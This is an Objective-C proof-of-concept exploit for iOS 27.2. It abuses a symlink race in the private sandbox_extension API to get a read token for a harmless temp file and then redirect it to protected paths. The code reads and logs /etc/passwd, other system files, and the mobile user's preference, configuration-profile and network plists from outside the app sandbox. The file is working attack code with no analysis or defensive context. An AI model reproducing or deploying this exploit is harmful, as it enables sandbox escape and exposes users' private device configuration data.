// iOS 27.2
// clang -framework Foundation -o poc poc.m
#import <Foundation/Foundation.h>
#include <unistd.h>

extern char *sandbox_extension_issue_file(const char *, const char *, uint64_t);
extern int64_t sandbox_extension_consume(const char *);
extern void sandbox_extension_release(int64_t);

static void r(const char *p, const char *s, const char *l) {
    unlink(l); symlink(s, l);
    char *t = sandbox_extension_issue_file("com.apple.app-sandbox.read", l, 0);
    if (!t) return;
    unlink(l); symlink(p, l);
    int64_t h = sandbox_extension_consume(t);
    NSData *d = [NSData dataWithContentsOfFile:@(l)];
    if (d.length) {
        NSString *x = [[NSString alloc] initWithData:[d subdataWithRange:NSMakeRange(0,MIN(100,d.length))]
            encoding:NSUTF8StringEncoding];
        NSLog(@"[+] %s — %lu bytes%@", p, (unsigned long)d.length,
            x ? [NSString stringWithFormat:@"\n    %@", [x stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"]] : @" (binary)");
    }
    if (h>0) sandbox_extension_release(h);
    free(t);
}

int main() {
    @autoreleasepool {
        NSString *tmp = NSTemporaryDirectory();
        const char *s = [tmp stringByAppendingPathComponent:@"s"].UTF8String;
        const char *l = [tmp stringByAppendingPathComponent:@"l"].UTF8String;
        [@"x" writeToFile:@(s) atomically:YES encoding:NSUTF8StringEncoding error:nil];

        NSLog(@"[*] sandbox_extension TOCTOU");
        r("/etc/passwd", s, l);
        r("/etc/group", s, l);
        r("/etc/hosts", s, l);
        r("/etc/protocols", s, l);
        r("/etc/services", s, l);
        r("/var/mobile/Library/Preferences/.GlobalPreferences.plist", s, l);
        r("/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist", s, l);
        r("/var/preferences/com.apple.networkd.plist", s, l);
        unlink(l); unlink(s);
    }
}
